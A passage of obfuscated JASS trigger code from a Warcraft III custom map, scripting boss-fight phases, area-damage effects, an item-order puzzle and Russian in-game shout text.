call EnableTrigger(GetTriggeringTrigger())
endfunction
function Beb takes nothing returns nothing
set dK=CreateTrigger()
call TriggerRegisterUnitEvent(dK,Ku,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dK,function Bea)
endfunction
function Bec takes nothing returns nothing
local unit Hu=GetEnumUnit()
call UnitDamageTarget(Lj,Hu,25000,true,false,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL,WEAPON_TYPE_WHOKNOWS)
set Hu=null
endfunction
function Bed takes nothing returns nothing
local unit Hu=LoadUnitHandle(dM,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Hu)
local real MD=GetLocationX(Ht)
local real ME=GetLocationY(Ht)
local real NT=350.
local group V9=CreateGroup()
local boolexpr dN=Condition(function my)
call GroupEnumUnitsInRange(V9,MD,ME,NT,dN)
call DestroyBoolExpr(dN)
call DestroyEffect(AddSpecialEffect("war3mapImported\\Singularity II Orange.mdl",GetLocationX(Ht),GetLocationY(Ht)))
call RemoveUnit(Hu)
call ForGroup(V9,function Bec)
call DestroyGroup(V9)
set dN=null
set V9=null
set Hu=null
call RemoveLocation(Ht)
set Ht=null
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function Bee takes nothing returns nothing
local unit Mc
local integer No
local location Np
local unit Nt
local timer Ny
if GetUnitLifePercent(GetTriggerUnit())<=dF[1] then
set Mc=GetTriggerUnit()
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),dF[1])
set dF[1]=dF[1]-7.
call nh(Lj,"|c00ff9696Пробежимся?",.028,255,255,255)
set No=1
loop
set Np=GetUnitLoc(Mc)
set Nt=CreateUnitAtLoc(Player(10),$6E303031,Np,0)
set Ny=CreateTimer()
call SaveUnitHandle(dM,GetHandleId(Ny),1,Nt)
call TimerStart(Ny,2,true,function Bed)
call RemoveLocation(Np)
set Np=null
set Nt=null
set Ny=null
call TriggerSleepAction(2)
set No=No+1
exitwhen No>=5
endloop
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bef takes nothing returns nothing
local trigger dL=CreateTrigger()
call TriggerRegisterUnitEvent(dL,Lj,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dL,function Bee)
set dL=null
endfunction
function Beg takes nothing returns nothing
local integer L9=LoadInteger(dM,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Lj)
local location Nk
if L9==1 then
set Nk=Location(20955,3056)
elseif L9==2 then
set Nk=Location(20955,2149)
elseif L9==3 then
set Nk=Location(21920,3054)
elseif L9==4 then
set Nk=Location(21920,2157)
endif
call SaveInteger(dM,GetHandleId(GetExpiredTimer()),2,LoadInteger(dM,GetHandleId(GetExpiredTimer()),2)-1)
if DistanceBetweenPoints(Ht,Nk)<=150 then
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call UnitRemoveAbility(Lj,$41305A50)
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
elseif LoadInteger(dM,GetHandleId(GetExpiredTimer()),2)<=0 then
if DistanceBetweenPoints(Ht,Nk)>150 then
call SetUnitLifePercentBJ(Lj,100)
set dF[1]=93
set dF[2]=80
set dF[3]=95
set dF[4]=90
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call UnitRemoveAbility(Lj,$41305A50)
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
endif
endif
set Nk=null
set Ht=null
endfunction
function Beh takes nothing returns nothing
local integer Mc
local timer No
if GetUnitLifePercent(GetTriggerUnit())<=dF[2] then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),dF[2])
set dF[2]=dF[2]-20.
set Mc=GetRandomInt(1,4)
if Mc==1 then
call nh(Lj,"Затопчу",.028,255,0,0)
elseif Mc==2 then
call nh(Lj,"Затопчу",.028,255,100,0)
elseif Mc==3 then
call nh(Lj,"Затопчу",.028,0,255,0)
elseif Mc==4 then
call nh(Lj,"Затопчу",.028,0,0,255)
endif
call UnitAddAbility(GetTriggerUnit(),$41305A50)
set No=CreateTimer()
call SaveInteger(dM,GetHandleId(No),1,Mc)
call SaveInteger(dM,GetHandleId(No),2,25)
call TimerStart(No,.2,true,function Beg)
set No=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bei takes nothing returns nothing
local trigger dO=CreateTrigger()
call TriggerRegisterUnitEvent(dO,Lj,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dO,function Beh)
set dO=null
endfunction
function Bej takes nothing returns nothing
local location Mc
local unit No
local real Np
local real Nt
local location Ny
local group Ot
local boolexpr Ou
if GetUnitLifePercent(GetTriggerUnit())<=dF[3] then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),dF[3])
set dF[3]=dF[3]-10.
set Mc=Location(GetRandomReal(20950,21930),GetRandomReal(2156,3071))
set No=CreateUnitAtLoc(Player(10),$6E303032,Mc,0)
call nh(No,"|c00ff00ffЖивые падут!",.028,255,255,255)
call TriggerSleepAction(2)
set Np=300
loop
set Nt=0
loop
set Ny=nU(Mc,Np,Nt)
set Ot=CreateGroup()
set Ou=Condition(function my)
call GroupEnumUnitsInRange(Ot,GetLocationX(Ny),GetLocationY(Ny),300,Ou)
call DestroyBoolExpr(Ou)
call DestroyEffect(AddSpecialEffect("war3mapImported\\Singularity II Orange.mdl",GetLocationX(Ny),GetLocationY(Ny)))
call RemoveUnit(No)
call ForGroup(Ot,function Bec)
call DestroyGroup(Ot)
set Ou=null
set Ot=null
call RemoveLocation(Ny)
set Ny=null
set Nt=Nt+30
exitwhen Nt>=360
endloop
call TriggerSleepAction(2)
set Np=Np+300
exitwhen Np>900
endloop
set No=null
call RemoveLocation(Mc)
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bek takes nothing returns nothing
local trigger dP=CreateTrigger()
call TriggerRegisterUnitEvent(dP,Lj,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dP,function Bej)
set dP=null
endfunction
function Bel takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(Lj)
local location dR
call SetUnitFacingTimed(Hu,AngleBetweenPoints(GetUnitLoc(Hu),GetUnitLoc(Lj)),0)
set dR=PolarProjectionBJ(Ht,10.,GetUnitFacing(Hu)-180.)
call SetUnitPositionLoc(Hu,dR)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\SandWaveDamage.mdl",Hu,"origin"))
call RemoveLocation(Ht)
call RemoveLocation(Nk)
call RemoveLocation(dR)
set Ht=null
set Nk=null
set dR=null
set Hu=null
endfunction
function Bem takes nothing returns nothing
local group V9=CreateGroup()
local boolexpr dN=Condition(function mv)
call GroupEnumUnitsInRange(V9,GetUnitX(Lj),GetUnitY(Lj),3000,dN)
call DestroyBoolExpr(dN)
call ForGroup(V9,function Bel)
call DestroyGroup(V9)
set dN=null
set V9=null
endfunction
function Ben takes nothing returns nothing
local location Mc
local effect No
local timer Np
if GetUnitLifePercent(GetTriggerUnit())<=dF[4] then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),dF[4])
set dF[4]=dF[4]-40.
set Mc=Location(21419,2602)
call SetUnitPositionLoc(Lj,Mc)
call SetUnitFacingTimed(Lj,0,270)
call SetUnitInvulnerable(Lj,true)
call PauseUnit(Lj,true)
set No=AddSpecialEffectTarget("war3mapImported\\SandAura2.mdl",Lj,"origin")
call RemoveLocation(Mc)
set Mc=null
call nh(Lj,"|c00ffff00Пещаная буря!",.028,255,255,255)
call UnitAddAbility(Lj,$41305A50)
call TriggerSleepAction(2.5)
set Np=CreateTimer()
call TimerStart(Np,.07,true,function Bem)
call TriggerSleepAction(7.5)
call SetUnitInvulnerable(Lj,false)
call PauseUnit(Lj,false)
call UnitRemoveAbility(Lj,$41305A50)
call DestroyEffect(No)
call PauseTimer(Np)
call DestroyTimer(Np)
set Np=null
set No=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Beo takes nothing returns nothing
local trigger dQ=CreateTrigger()
call TriggerRegisterUnitEvent(dQ,Lj,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dQ,function Ben)
set dQ=null
endfunction
function Bep takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303754) then
return false
endif
return true
endfunction
function Beq takes nothing returns boolean
if not (RectContainsUnit(GX,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Ber takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bes takes nothing returns nothing
if Bep() then
set dF[1]=93
set dF[2]=80
set dF[3]=95
set dF[4]=90
set Vz=Location(21434.,2676.)
call SetUnitPositionLoc(Lj,Vz)
call RemoveLocation(Vz)
call SetUnitInvulnerable(Lj,true)
call SetUnitOwner(Lj,Player(PLAYER_NEUTRAL_PASSIVE),true)
else
endif
if Ber() then
if Beq() then
set Xq[777]=1
set V0=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call KillUnit(GetTriggerUnit())
call RemoveLocation(V0)
else
endif
else
endif
endfunction
function Bet takes nothing returns nothing
set dS=CreateTrigger()
call TriggerRegisterLeaveRectSimple(dS,GW)
call TriggerAddAction(dS,function Bes)
endfunction
function Beu takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[10]) then
return false
endif
return true
endfunction
function Bev takes nothing returns boolean
if not (T3==5) then
return false
endif
return true
endfunction
function Bew takes nothing returns boolean
if not (T3==4) then
return false
endif
return true
endfunction
function Bex takes nothing returns boolean
if not (T3==3) then
return false
endif
return true
endfunction
function Bey takes nothing returns boolean
if not (T3==2) then
return false
endif
return true
endfunction
function Bez takes nothing returns boolean
if not (T3==1) then
return false
endif
return true
endfunction
function Be0 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Be1 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Be2 takes nothing returns boolean
if T3!=3 then
return true
endif
return false
endfunction
function Be3 takes nothing returns boolean
if not Be2() then
return false
endif
return true
endfunction
function Be4 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[10])
set Tt[10]=Tt[10]-10.
set V0=GetRectCenter(FW)
set Vz=PolarProjectionBJ(V0,600.,50.)
call CreateItemLoc($4930554C,Vz)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,170.)
call CreateItemLoc($4930554D,Vz)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,290.)
call CreateItemLoc($4930554E,Vz)
call RemoveLocation(Vz)
call RemoveLocation(V0)
set T3=GetRandomInt(1,5)
if Bez() then
call EnableTrigger(dU)
set T3=0
call CreateTextTagLocBJ("|c00ff00001|r|c0000ff002|r|c000000ff3|r",GetUnitLoc(GetTriggerUnit()),0,30.,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,180.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
if Bey() then
call EnableTrigger(dV)
set T3=0
call CreateTextTagLocBJ("|c0000ff001|r|c00ff00002|r|c000000ff3|r",GetUnitLoc(GetTriggerUnit()),0,30.,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,180.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
if Bex() then
call EnableTrigger(dW)
set T3=0
call CreateTextTagLocBJ("|c000000ff1|r|c00ff00002|r|c0000ff003|r",GetUnitLoc(GetTriggerUnit()),0,30.,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,180.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
if Bew() then
call EnableTrigger(dX)
set T3=0
call CreateTextTagLocBJ("|c000000ff1|r|c0000ff002|r|c00ff00003|r",GetUnitLoc(GetTriggerUnit()),0,30.,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,180.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
if Bev() then
call EnableTrigger(dY)
set T3=0
call CreateTextTagLocBJ("|c0000ff001|r|c000000ff2|r|c00ff00003|r",GetUnitLoc(GetTriggerUnit()),0,30.,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,180.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
endif
endif
endif
endif
endif
call TriggerSleepAction(5.5)
if Be3() then
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
set SR=GetUnitsInRectMatching(FW,Condition(function Be0))
call ForGroupBJ(SR,function Be1)
call DestroyGroup(SR)
else
endif
call EnableTrigger(GetTriggeringTrigger())
call DisableTrigger(dU)
call DisableTrigger(dV)
call DisableTrigger(dW)
call DisableTrigger(dX)
call DisableTrigger(dY)
endfunction
function Be5 takes nothing returns nothing
set dT=CreateTrigger()
call TriggerRegisterUnitEvent(dT,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dT,Condition(function Beu))
call TriggerAddAction(dT,function Be4)
endfunction
function Be6 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554C) then
return false
endif
if not (T3==0) then
return false
endif
return true
endfunction
function Be7 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554D) then
return false
endif
if not (T3==1) then
return false
endif
return true
endfunction
function Be8 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554E) then
return false
endif
if not (T3==2) then
return false
endif
return true
endfunction
function Be9 takes nothing returns nothing
if Be6() then
set T3=1
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if Be7() then
set T3=2
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if Be8() then
set T3=3
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BfB takes nothing returns nothing
set dU=CreateTrigger()
call DisableTrigger(dU)
call TriggerRegisterAnyUnitEventBJ(dU,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(dU,function Be9)
endfunction
function BfC takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554D) then
return false
endif
if not (T3==0) then
return false
endif
return true
endfunction
function BfD takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554C) then
return false
endif
if not (T3==1) then
return false
endif
return true
endfunction
function BfE takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554E) then
return false
endif
if not (T3==2) then
return false
endif
return true
endfunction
function BfF takes nothing returns nothing
if BfC() then
set T3=1
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfD() then
set T3=2
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfE() then
set T3=3
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BfG takes nothing returns nothing
set dV=CreateTrigger()
call DisableTrigger(dV)
call TriggerRegisterAnyUnitEventBJ(dV,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(dV,function BfF)
endfunction
function BfH takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554E) then
return false
endif
if not (T3==0) then
return false
endif
return true
endfunction
function BfI takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554C) then
return false
endif
if not (T3==1) then
return false
endif
return true
endfunction
function BfJ takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554D) then
return false
endif
if not (T3==2) then
return false
endif
return true
endfunction
function BfK takes nothing returns nothing
if BfH() then
set T3=1
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfI() then
set T3=2
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfJ() then
set T3=3
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BfL takes nothing returns nothing
set dW=CreateTrigger()
call DisableTrigger(dW)
call TriggerRegisterAnyUnitEventBJ(dW,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(dW,function BfK)
endfunction
function BfM takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554E) then
return false
endif
if not (T3==0) then
return false
endif
return true
endfunction
function BfN takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554D) then
return false
endif
if not (T3==1) then
return false
endif
return true
endfunction
function BfO takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554C) then
return false
endif
if not (T3==2) then
return false
endif
return true
endfunction
function BfP takes nothing returns nothing
if BfM() then
set T3=1
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfN() then
set T3=2
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfO() then
set T3=3
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BfQ takes nothing returns nothing
set dX=CreateTrigger()
call DisableTrigger(dX)
call TriggerRegisterAnyUnitEventBJ(dX,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(dX,function BfP)
endfunction
function BfR takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554D) then
return false
endif
if not (T3==0) then
return false
endif
return true
endfunction
function BfS takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554E) then
return false
endif
if not (T3==1) then
return false
endif
return true
endfunction
function BfT takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930554C) then
return false
endif
if not (T3==2) then
return false
endif
return true
endfunction
function BfU takes nothing returns nothing
if BfR() then
set T3=1
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfS() then
set T3=2
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
if BfT() then
set T3=3
call CreateTextTagUnitBJ("Отлично!",GetTriggerUnit(),0,10.,0.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BfV takes nothing returns nothing
set dY=CreateTrigger()
call DisableTrigger(dY)
call TriggerRegisterAnyUnitEventBJ(dY,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(dY,function BfU)
endfunction
function BfW takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[11]) then
return false
endif
return true
endfunction
function BfX takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[11])
set Tt[11]=Tt[11]-20.
set Rt=GetRandomReal(0,45.)
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=8
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set Rt=Rt+45.
set V0=GetRectCenter(FW)
set Rs[2]=GetRandomReal(Rt-2.,Rt+2.)
set Ru[2]=GetRandomReal(-5.,5.)
set Rr[2]=GetRandomReal(450.,450.)
call CreateNUnitsAtLoc(1,$6E303842,GetOwningPlayer(GetTriggerUnit()),V0,Rs[2])
set WS[2]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(10.,$42544C46,WS[2])
set WR[2]=PolarProjectionBJ(V0,Rr[2],Rs[2])
call SetUnitPositionLoc(WS[2],WR[2])
call RemoveLocation(V0)
call RemoveLocation(WR[2])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call TriggerSleepAction(1.)
set Rt=GetRandomReal(0,45.)
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=18
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set Rt=Rt+20.
set V0=GetRectCenter(FW)
set Rs[2]=GetRandomReal(Rt-2.,Rt+2.)
set Ru[2]=GetRandomReal(-5.,5.)
set Rr[2]=GetRandomReal(750.,750.)
call CreateNUnitsAtLoc(1,$6E303842,GetOwningPlayer(GetTriggerUnit()),V0,Rs[2])
set WS[2]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(10.,$42544C46,WS[2])
set WR[2]=PolarProjectionBJ(V0,Rr[2],Rs[2])
call SetUnitPositionLoc(WS[2],WR[2])
call RemoveLocation(V0)
call RemoveLocation(WR[2])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BfY takes nothing returns nothing
set dZ=CreateTrigger()
call TriggerRegisterUnitEvent(dZ,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dZ,Condition(function BfW))
call TriggerAddAction(dZ,function BfX)
endfunction
function BfZ takes nothing returns boolean
if not (GetUnitTypeId(GetAttacker())==$6E303842) then
return false
endif
return true
endfunction
function Bfa takes nothing returns nothing
call SetUnitLifePercentBJ(GetTriggerUnit(),GetUnitLifePercent(GetTriggerUnit())-35.)
endfunction
function Bfb takes nothing returns nothing
set da=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(da,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(da,Condition(function BfZ))
call TriggerAddAction(da,function Bfa)
endfunction
function Bfc takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[12]) then
return false
endif
return true
endfunction
function Bfd takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bfe takes nothing returns boolean
if not (GetUnitFacing(GetEnumUnit())<=335.) then
return false
endif
if not (GetUnitFacing(GetEnumUnit())>=285.) then
return false
endif
return true
endfunction
function Bff takes nothing returns nothing
if Bfe() then
else
call KillUnit(GetEnumUnit())
endif
endfunction
function Bfg takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bfh takes nothing returns boolean
if not (GetUnitFacing(GetEnumUnit())<=245.) then
return false
endif
if not (GetUnitFacing(GetEnumUnit())>=205.) then
return false
endif
return true
endfunction
function Bfi takes nothing returns nothing
if Bfh() then
else
call KillUnit(GetEnumUnit())
endif
endfunction
function Bfj takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bfk takes nothing returns boolean
if not (GetUnitFacing(GetEnumUnit())<=155.) then
return false
endif
if not (GetUnitFacing(GetEnumUnit())>=115.) then
return false
endif
return true
endfunction
function Bfl takes nothing returns nothing
if Bfk() then
else
call KillUnit(GetEnumUnit())
endif
endfunction
function Bfm takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bfn takes nothing returns boolean
if not (GetUnitFacing(GetEnumUnit())<=55.) then
return false
endif
if not (GetUnitFacing(GetEnumUnit())>=25.) then
return false
endif
return true
endfunction
function Bfo takes nothing returns nothing
if Bfn() then
else
call KillUnit(GetEnumUnit())
endif
endfunction
function Bfp takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[12])
set Tt[12]=Tt[12]-20.
call SetUnitInvulnerable(GetTriggerUnit(),true)
call SetUnitOwner(Kx,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitPositionLoc(Kx,GetRectCenter(FW))
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Desecrate_JFI.mdx",GetTriggerUnit(),"chest"))
call AddSpecialEffectTargetUnitBJ("origin",KF,"war3mapImported\\Desecrate_JFI.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.7)
set SR=GetUnitsInRectMatching(FW,Condition(function Bfd))
call ForGroupBJ(SR,function Bff)
call DestroyGroup(SR)
call AddSpecialEffectTargetUnitBJ("origin",KE,"war3mapImported\\Desecrate_JFI.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.7)
set SR=GetUnitsInRectMatching(FW,Condition(function Bfg))
call ForGroupBJ(SR,function Bfi)
call DestroyGroup(SR)
call AddSpecialEffectTargetUnitBJ("origin",KD,"war3mapImported\\Desecrate_JFI.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.7)
set SR=GetUnitsInRectMatching(FW,Condition(function Bfj))
call ForGroupBJ(SR,function Bfl)
call DestroyGroup(SR)
call AddSpecialEffectTargetUnitBJ("origin",KC,"war3mapImported\\Desecrate_JFI.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.7)
set SR=GetUnitsInRectMatching(FW,Condition(function Bfm))
